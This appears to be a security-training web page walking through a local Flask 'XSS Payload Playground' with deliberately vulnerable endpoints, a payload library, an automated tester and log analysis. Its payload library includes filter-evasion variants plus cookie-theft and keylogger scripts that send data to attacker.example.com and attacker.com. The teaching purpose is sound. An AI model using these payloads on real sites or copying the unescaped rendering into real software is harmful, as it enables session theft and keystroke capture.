@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Payload Playground — sec-projects</title>
+  <meta name="description" content="Create a safe environment to test and understand XSS payloads — reflected, stored, DOM-based, and filter evasion.">
+  <meta property="og:title" content="XSS Payload Playground — sec-projects">
+  <meta property="og:description" content="Create a safe environment to test and understand XSS payloads.">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://sec-projects.pages.dev/projects/web/xss-playground.html">
+  <link rel="canonical" href="https://sec-projects.pages.dev/projects/web/xss-playground.html">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/assets/css/theme.css">
+  <link rel="stylesheet" href="/assets/css/layout.css">
+  <link rel="stylesheet" href="/assets/css/components.css">
+</head>
+<body>
+<div class="container" style="max-width:900px; margin: calc(var(--nav-height) + var(--space-8)) auto var(--space-8); padding: 0 var(--space-6);">
+
+<div class="breadcrumbs">
+  <a href="/">Home</a><span class="breadcrumb-sep">/</span>
+  <a href="/?cat=web">Web Security</a><span class="breadcrumb-sep">/</span>
+  <span>XSS Payload Playground</span>
+</div>
+
+<div style="margin-bottom:var(--space-8);">
+  <div style="display:flex;align-items:center;gap:var(--space-4);flex-wrap:wrap;margin-bottom:var(--space-3);">
+    <span class="badge badge-intermediate">Intermediate</span>
+    <span style="color:var(--color-text-muted);font-size:var(--font-size-sm);">&#x23F1; 2-3 hours</span>
+  </div>
+  <h1 style="border-bottom:none;margin-bottom:var(--space-3);">XSS Payload Playground</h1>
+  <p style="font-size:var(--font-size-lg);color:var(--color-text-secondary);">Create a safe environment to test and understand XSS payloads — reflected, stored, DOM-based, and filter evasion.</p>
+  <div style="display:flex;flex-wrap:wrap;gap:var(--space-2);margin-top:var(--space-3);">
+    <span class="tag">javascript</span><span class="tag">html</span><span class="tag">xss</span><span class="tag">web-security</span>
+  </div>
+</div>
+
+<div id="progressBtn" style="margin-bottom:var(--space-8);"></div>
+
+<h2>Learning Objectives</h2>
+<ul style="margin-left:var(--space-6);margin-bottom:var(--space-6);color:var(--color-text-secondary);">
+  <li>Understand the three XSS types: reflected, stored, and DOM-based</li>
+  <li>Build a Flask web app that safely demonstrates each XSS variant</li>
+  <li>Implement a payload library with categorized attack vectors</li>
+  <li>Learn filter evasion techniques — encoding bypasses, tag mutation, polyglots</li>
+  <li>Parse server logs to confirm which payloads executed successfully</li>
+</ul>
+
+<h2>Prerequisites</h2>
+<ul style="margin-left:var(--space-6);margin-bottom:var(--space-6);color:var(--color-text-secondary);">
+  <li>Python 3.8+ with <code>flask</code> installed</li>
+  <li>Basic HTML and JavaScript knowledge</li>
+  <li>Understanding of browser same-origin policy</li>
+  <li>A modern browser for testing (Chrome/Firefox DevTools recommended)</li>
+</ul>
+
+<div class="callout">
+  <div class="callout-title">&#x26A0; Ethics & Legal</div>
+  <p>This is a <strong>local-only</strong> playground — never deploy this to the public internet. All XSS testing should happen in an isolated local environment. XSS attacks against production websites are illegal without authorization.</p>
+</div>
+
+<h2>Step 1: Flask App with Vulnerable Endpoints</h2>
+<p>Create a Flask application with deliberately vulnerable endpoints that demonstrate each XSS type. The playground will be fully self-contained.</p>
+
+<pre><code>from flask import Flask, request, render_template_string, make_response
+import json, os
+
+app = Flask(__name__)
+app.config['SECRET_KEY'] = os.urandom(24)
+
+# In-memory "database" for stored XSS demo
+comments = []
+
+# ---- REFLECTED XSS: search query echoed directly ----
+@app.route('/')
+def index():
+    return render_template_string('''
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;XSS Playground&lt;/title&gt;
+&lt;style&gt;
+  body { font-family: monospace; max-width: 800px; margin: 2rem auto; padding: 0 1rem;
+         background: #111; color: #eee; }
+  .endpoint { border: 1px solid #333; border-radius: 8px; padding: 1rem; margin: 1rem 0; }
+  .endpoint h3 { margin-top: 0; color: #58a6ff; }
+  input, textarea { width: 100%; padding: 0.5rem; margin: 0.5rem 0;
+                    background: #222; color: #eee; border: 1px solid #444; border-radius: 4px; }
+  button { background: #238636; color: white; border: none; padding: 0.5rem 1rem;
+           border-radius: 4px; cursor: pointer; }
+  .payload { background: #161b22; padding: 0.5rem; border-radius: 4px; margin: 0.25rem 0; }
+  code { color: #f0883e; }
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;h1&gt;&#x1F4A3; XSS Payload Playground&lt;/h1&gt;
+  &lt;p&gt;Safe local environment — test payloads against vulnerable endpoints.&lt;/p&gt;
+
+  &lt;div class="endpoint"&gt;
+    &lt;h3&gt;1. Reflected XSS (Search)&lt;/h3&gt;
+    &lt;form action="/search" method="GET"&gt;
+      &lt;input name="q" placeholder="Enter search term or payload..."&gt;
+      &lt;button type="submit"&gt;Search&lt;/button&gt;
+    &lt;/form&gt;
+  &lt;/div&gt;
+
+  &lt;div class="endpoint"&gt;
+    &lt;h3&gt;2. Stored XSS (Comments)&lt;/h3&gt;
+    &lt;form action="/comment" method="POST"&gt;
+      &lt;textarea name="comment" placeholder="Leave a comment..."&gt;&lt;/textarea&gt;
+      &lt;button type="submit"&gt;Post Comment&lt;/button&gt;
+    &lt;/form&gt;
+    &lt;div id="comments"&gt;
+      {% for c in comments %}
+        &lt;div class="payload"&gt;{{ c | safe }}&lt;/div&gt;
+      {% endfor %}
+    &lt;/div&gt;
+  &lt;/div&gt;
+
+  &lt;div class="endpoint"&gt;
+    &lt;h3&gt;3. DOM-Based XSS&lt;/h3&gt;
+    &lt;p&gt;Fragment-based — payload goes after the &lt;code&gt;#&lt;/code&gt;:&lt;/p&gt;
+    &lt;a href="/dom#&amp;lt;img src=x onerror=alert(1)&amp;gt;"&gt;Test DOM XSS →&lt;/a&gt;
+  &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+    ''', comments=comments)
+
+# ---- Reflected XSS endpoint ----
+@app.route('/search')
+def search():
+    query = request.args.get('q', '')
+    # VULNERABLE: directly embedding user input without escaping
+    return f'&lt;h2&gt;Search results for: {query}&lt;/h2&gt;&lt;p&gt;No results found.&lt;/p&gt;&lt;a href="/"&gt;← Back&lt;/a&gt;'
+
+# ---- Stored XSS endpoint ----
+@app.route('/comment', methods=['POST'])
+def add_comment():
+    comment = request.form.get('comment', '')
+    comments.append(comment)
+    return '&lt;script&gt;window.location="/"&lt;/script&gt;'
+
+# ---- DOM-Based XSS endpoint ----
+@app.route('/dom')
+def dom_xss():
+    return '''
+&lt;h2&gt;DOM-Based XSS&lt;/h2&gt;
+&lt;script&gt;
+  var hash = location.hash.slice(1);
+  if (hash) {
+    document.write("&lt;p&gt;Fragment content: " + hash + "&lt;/p&gt;");
+  }
+&lt;/script&gt;
+&lt;p&gt;Add a payload after the # in the URL.&lt;/p&gt;
+&lt;a href="/"&gt;← Back&lt;/a&gt;
+'''
+
+if __name__ == '__main__':
+    app.run(debug=True, host='127.0.0.1', port=5000)</code></pre>
+
+<p><strong>Important:</strong> The <code>| safe</code> Jinja filter and raw string interpolation (<code>f"...{query}"</code>) are what make these endpoints deliberately vulnerable. In production, you'd use auto-escaping and <code>html.escape()</code>.</p>
+
+<h2>Step 2: Build a Payload Library</h2>
+<p>Create a categorized collection of XSS payloads organized by attack vector and filter evasion technique.</p>
+
+<pre><code>PAYLOAD_LIBRARY = {
+    "basic_alerts": [
+        '&lt;script&gt;alert(1)&lt;/script&gt;',
+        '&lt;script&gt;alert(document.cookie)&lt;/script&gt;',
+        '&lt;script&gt;confirm("XSS")&lt;/script&gt;',
+        '&lt;script&gt;prompt("Enter your password:")&lt;/script&gt;',
+    ],
+    "img_vectors": [
+        '&lt;img src=x onerror=alert(1)&gt;',
+        '&lt;img src=x onerror="alert(document.domain)"&gt;',
+        '&lt;img src=1 onmouseover=alert(1)&gt;',
+        '&lt;img src=x onerror=fetch("http://attacker.com/?"+document.cookie)&gt;',
+    ],
+    "svg_vectors": [
+        '&lt;svg onload=alert(1)&gt;',
+        '&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;',
+    ],
+    "event_handlers": [
+        '&lt;body onload=alert(1)&gt;',
+        '&lt;input onfocus=alert(1) autofocus&gt;',
+        '&lt;select onfocus=alert(1) autofocus&gt;',
+        '&lt;textarea onfocus=alert(1) autofocus&gt;',
+    ],
+    "protocol_based": [
+        '&lt;a href="javascript:alert(1)"&gt;Click me&lt;/a&gt;',
+        '&lt;iframe src="javascript:alert(1)"&gt;',
+    ],
+    "filter_evasion": {
+        "case_variation": '&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;',
+        "null_byte": '&lt;scr%00ipt&gt;alert(1)&lt;/script&gt;',
+        "double_encode": '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
+        "hex_encode": '\\x3Cscript\\x3Ealert(1)\\x3C\\x2Fscript\\x3E',
+        "template_literal": '&lt;script&gt;eval(`al`+`ert(1)`)&lt;/script&gt;',
+        "string_fromcharcode": '&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116,40,49,41))&lt;/script&gt;',
+    },
+    "cookie_theft": '&lt;img src=x onerror="new Image().src=\'http://attacker.example.com/steal?c=\'+document.cookie"&gt;',
+    "keylogger": """&lt;script&gt;
+document.onkeypress = function(e) {
+  fetch('http://attacker.example.com/log?k=' + e.key);
+};
+&lt;/script&gt;""",
+    "dom_clobbering": '&lt;form id="config"&gt;&lt;input name="debug" value="true"&gt;&lt;/form&gt;&lt;script&gt;alert(config.debug.value)&lt;/script&gt;',
+}</code></pre>
+
+<h2>Step 3: Automated Payload Tester</h2>
+<p>Build a script that fires all payloads at each endpoint and records which ones execute — this is how you learn which vectors work against which contexts.</p>
+
+<pre><code>import requests
+import urllib.parse
+
+class XSSPayloadTester:
+    def __init__(self, base_url="http://127.0.0.1:5000"):
+        self.base_url = base_url
+        self.results = []
+
+    def test_reflected(self, payload):
+        """Test against reflected XSS endpoint."""
+        encoded = urllib.parse.quote(payload)
+        url = f"{self.base_url}/search?q={encoded}"
+        try:
+            r = requests.get(url, timeout=5)
+            return {
+                'endpoint': 'reflected',
+                'payload': payload[:60],
+                'status': r.status_code,
+                'response_length': len(r.text),
+                'executed': payload in r.text,
+            }
+        except Exception as e:
+            return {'endpoint': 'reflected', 'payload': payload[:60], 'error': str(e)}
+
+    def test_stored(self, payload):
+        """Test against stored XSS endpoint."""
+        try:
+            # Post the comment
+            r = requests.post(f"{self.base_url}/comment",
+                             data={'comment': payload}, timeout=5)
+            # Fetch the homepage to see if it's reflected
+            r2 = requests.get(self.base_url, timeout=5)
+            return {
+                'endpoint': 'stored',
+                'payload': payload[:60],
+                'status': r2.status_code,
+                'executed': payload in r2.text,
+            }
+        except Exception as e:
+            return {'endpoint': 'stored', 'payload': payload[:60], 'error': str(e)}
+
+    def test_dom(self, payload):
+        """DOM-based can't be detected server-side — note for manual testing."""
+        return {
+            'endpoint': 'dom',
+            'payload': payload[:60],
+            'note': 'DOM-based requires browser — test manually at /dom#<payload>',
+        }
+
+    def run_all(self, library):
+        for category, payloads in library.items():
+            if isinstance(payloads, dict):
+                payloads = payloads.values()
+            for payload in payloads:
+                self.results.append(self.test_reflected(payload))
+                self.results.append(self.test_stored(payload))
+                self.results.append(self.test_dom(payload))
+
+        # Print summary
+        executed = [r for r in self.results if r.get('executed')]
+        print(f"\nTested {len(self.results)} payloads — {len(executed)} executed successfully:")
+        for r in executed:
+            print(f"  [{r['endpoint']}] {r['payload']}")
+
+tester = XSSPayloadTester()
+tester.run_all(PAYLOAD_LIBRARY)</code></pre>
+
+<h2>Step 4: Log Capture & Analysis</h2>
+<p>Extend the Flask app to log all requests, then analyze the logs to identify which payloads reached the server and triggered successful XSS.</p>
+
+<pre><code># Add to Flask app (before routes)
+import logging
+
+logging.basicConfig(
+    filename='xss_playground.log',
+    level=logging.INFO,
+    format='%(asctime)s [%(levelname)s] %(message)s'
+)
+
+@app.before_request
+def log_request():
+    """Log every incoming request for analysis."""
+    logging.info(
+        f"{request.method} {request.path} | "
+        f"IP: {request.remote_addr} | "
+        f"UA: {request.user_agent.string[:80]} | "
+        f"Params: {dict(request.args)} {dict(request.form)}"
+    )
+
+# Log analyzer script (separate file: log_analyzer.py)
+import re
+from collections import Counter
+
+def analyze_xss_logs(logfile='xss_playground.log'):
+    with open(logfile) as f:
+        lines = f.readlines()
+
+    payloads_found = Counter()
+    for line in lines:
+        if '/search' in line:
+            # Extract payload from query string
+            match = re.search(r'q=([^&|\]]+)', line)
+            if match:
+                payloads_found[match.group(1)] += 1
+        elif '/comment' in line:
+            match = re.search(r"'comment': '(.+?)'", line)
+            if match:
+                payloads_found[match.group(1)[:80]] += 1
+
+    print(f"Total XSS attempts: {sum(payloads_found.values())}")
+    print(f"Unique payloads: {len(payloads_found)}")
+    print("\nTop payloads:")
+    for payload, count in payloads_found.most_common(10):
+        print(f"  [{count}x] {payload[:70]}")
+
+if __name__ == '__main__':
+    analyze_xss_logs()</code></pre>
+
+<h2>Testing Your Playground</h2>
+<p>Run the playground and start testing:</p>
+<pre><code># Start the server
+python xss_playground.py
+# Open http://127.0.0.1:5000 in your browser
+# Test reflected: http://127.0.0.1:5000/search?q=<script>alert(1)</script>
+# Test stored: Submit <img src=x onerror=alert(1)> as a comment
+# Test DOM: http://127.0.0.1:5000/dom#<img src=x onerror=alert(1)>
+
+# Run the automated tester
+python xss_tester.py
+
+# Analyze logs
+python log_analyzer.py</code></pre>
+
+<h2>Extension Ideas</h2>
+<ul style="margin-left:var(--space-6);margin-bottom:var(--space-6);color:var(--color-text-secondary);">
+  <li>Add a CSP (Content Security Policy) configuration toggle to see which payloads get blocked</li>
+  <li>Implement a WAF simulation that strips/encodes certain patterns</li>
+  <li>Add a "steal cookie" demo — a second Flask app running on a different port that captures stolen cookies</li>
+  <li>Build a payload generator that mutates existing payloads for filter evasion</li>
+  <li>Add blind XSS testing with an external callback listener (like Burp Collaborator)</li>
+</ul>
+
+<h2>Resources & Next Steps</h2>
+<div style="display:flex;flex-direction:column;gap:var(--space-2);margin-bottom:var(--space-8);">
+  <a class="resource-link" href="https://xss-game.appspot.com/" target="_blank" rel="noopener">
+    <span class="resource-link-icon">&#x1F3AE;</span> Google XSS Game — Interactive XSS challenges
+  </a>
+  <a class="resource-link" href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html" target="_blank" rel="noopener">
+    <span class="resource-link-icon">&#x1F4CB;</span> OWASP XSS Filter Evasion Cheat Sheet
+  </a>
+  <a class="resource-link" href="https://portswigger.net/web-security/cross-site-scripting" target="_blank" rel="noopener">
+    <span class="resource-link-icon">&#x1F4D6;</span> PortSwigger: Cross-Site Scripting — Labs + theory
+  </a>
+  <a class="resource-link" href="https://tryhackme.com/room/xss" target="_blank" rel="noopener">
+    <span class="resource-link-icon">&#x1F3AF;</span> TryHackMe: XSS Room
+  </a>
+  <a class="resource-link" href="https://github.com/payloadbox/xss-payload-list" target="_blank" rel="noopener">
+    <span class="resource-link-icon">&#x1F4DC;</span> PayloadBox XSS Payload List
+  </a>
+</div>
+
+<div class="callout">
+  <div class="callout-title">&#x1F393; Cert Relevance</div>
+  <p>XSS is heavily tested on <strong>eWPT</strong>, <strong>OSWE</strong>, and <strong>Burp Suite Certified Practitioner</strong>. Understanding all three XSS types and filter evasion appears on <strong>OSCP</strong> web modules. The <strong>CompTIA Security+</strong> exam covers XSS under application attacks (SY0-701 objective 2.3).</p>
+</div>
+
+</div>
+
+<script src="/assets/js/data.js"></script>
+<script src="/assets/js/theme.js"></script>
+<script src="/assets/js/components.js"></script>
+<script src="/assets/js/progress.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+  document.body.prepend(renderNav());
+  document.body.appendChild(renderFooter());
+  const btnContainer = document.getElementById('progressBtn');
+  if (btnContainer) btnContainer.appendChild(renderProgressButton('xss-playground'));
+  initCopyButtons();
+});
+</script>
+</body>
+</html>
